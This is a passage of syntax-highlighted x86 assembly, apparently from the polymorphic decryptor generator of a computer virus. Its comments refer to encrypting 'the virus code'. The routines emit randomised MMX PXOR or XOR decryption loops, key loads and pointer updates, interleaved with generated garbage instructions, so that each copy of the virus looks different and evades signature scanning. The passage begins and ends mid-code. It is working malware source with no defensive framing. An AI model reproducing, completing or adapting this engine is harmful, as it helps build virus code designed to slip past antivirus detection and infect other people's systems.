    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@fix2</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000100b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_mask</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">@@lp_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@fix2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_LOADPOINTER</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Put in the register used as key the number used for the encryption of the</span><span class="sc0">
</span><span class="sc1">; virus code.</span><span class="sc0">

</span><span class="sc5">@@gen_loadkey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@glk_@@2</span><span class="sc0">
</span><span class="sc5">@@glk_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">                          </span><span class="sc1">; PUSH enc_key</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; POP reg_key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@enc_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_LOADKEY</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@glk_@@2</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; MOV key_reg,enc_key</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@enc_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_LOADKEY</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the code for pass the encryption key to an MMX register</span><span class="sc0">

</span><span class="sc5">@@gen_passkey2mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6E0Fh</span><span class="sc0">                        </span><span class="sc1">; MOV mmx_key,reg_key</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_PASSKEY2MMX</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Just for know where we must loop the decryptor</span><span class="sc0">

</span><span class="sc5">@@getloopaddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@l00paddress</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Pass the dword of code we are decrypting to the MMX register used for that</span><span class="sc0">
</span><span class="sc1">; matter</span><span class="sc0">

</span><span class="sc5">@@gen_passptr2mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6E0Fh</span><span class="sc0">                        </span><span class="sc1">; MOV mmx_ptr,[reg_ptr]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_PASSPTR2MMX</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the MMX encryption opcode:</span><span class="sc0">
</span><span class="sc1">; PXOR</span><span class="sc0">

</span><span class="sc5">@@gen_crypt_instructions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EF0Fh</span><span class="sc0">                          </span><span class="sc1">; PXOR mmx_ptr,mmx_key</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_CRYPT</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the alternative method of MMX encryption code:</span><span class="sc0">
</span><span class="sc1">; PXOR = XOR</span><span class="sc0">

</span><span class="sc5">@@gen_non_mmx_crypt_instructions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0031h</span><span class="sc0">                        </span><span class="sc1">; XOR [reg_ptr],reg_key</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the code that will pass the already decrypted data to its original</span><span class="sc0">
</span><span class="sc1">; position</span><span class="sc0">

</span><span class="sc5">@@gen_passmmx2ptr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7E0Fh</span><span class="sc0">                        </span><span class="sc1">; MOVD [reg_ptr],(mmx_ptr xor mmx_key)</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_PASSMMX2PTR</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Select the order between increase pointer and decrease counter</span><span class="sc0">

</span><span class="sc5">@@gen_incpointer_deccounter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gdc_gip</span><span class="sc0">
</span><span class="sc5">@@gip_gdc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_incpointer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_deccounter</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@gdc_gip</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_deccounter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_incpointer</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the code for make the pointer register to point to the next dword</span><span class="sc0">

</span><span class="sc5">@@gen_incpointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gip_@@2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gip_@@3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gip_@@4</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@gip_@@1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_@@5</span><span class="sc0">

</span><span class="sc5">@@gip_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">; ADD reg_ptr,4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_EXIT</span><span class="sc0">

</span><span class="sc5">@@gip_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gip_@@2_@@2</span><span class="sc0">
</span><span class="sc5">@@gip_@@2_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; ADD reg_ptr,3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_@@2_EXIT</span><span class="sc0">
</span><span class="sc5">@@gip_@@2_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">                     </span><span class="sc1">; ADD reg_ptr,3</span><span class="sc0">
</span><span class="sc5">@@gip_@@2_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_EXIT</span><span class="sc0">

</span><span class="sc5">@@gip_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gip_@@3_@@2</span><span class="sc0">
</span><span class="sc5">@@gip_@@3_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; ADD reg_ptr,2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">                     </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_@@2_EXIT</span><span class="sc0">
</span><span class="sc5">@@gip_@@3_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">                     </span><span class="sc1">; INC reg_ptr</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; ADD reg_ptr,2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_@@2_EXIT</span><span class="sc0">

</span><span class="sc5">@@gip_@@4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gip_@@4_@@2</span><span class="sc0">
</span><span class="sc5">@@gip_@@4_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; ADD reg_ptr,1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">                     </span><span class="sc1">; INC reg_ptr</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">                     </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_@@2_EXIT</span><span class="sc0">
</span><span class="sc5">@@gip_@@4_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">                     </span><span class="sc1">; INC reg_ptr</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_AddIt</span><span class="sc0">                     </span><span class="sc1">; ADD reg_ptr,1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gip_@@2_EXIT</span><span class="sc0">

</span><span class="sc5">@@gip_@@5</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gip_IncIt</span><span class="sc0">                     </span><span class="sc1">; INC reg_ptr</span><span class="sc0">
                        </span><span class="sc1">; INC reg_ptr</span><span class="sc0">

</span><span class="sc5">@@gip_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_INCPOINTER</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gip_AddIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
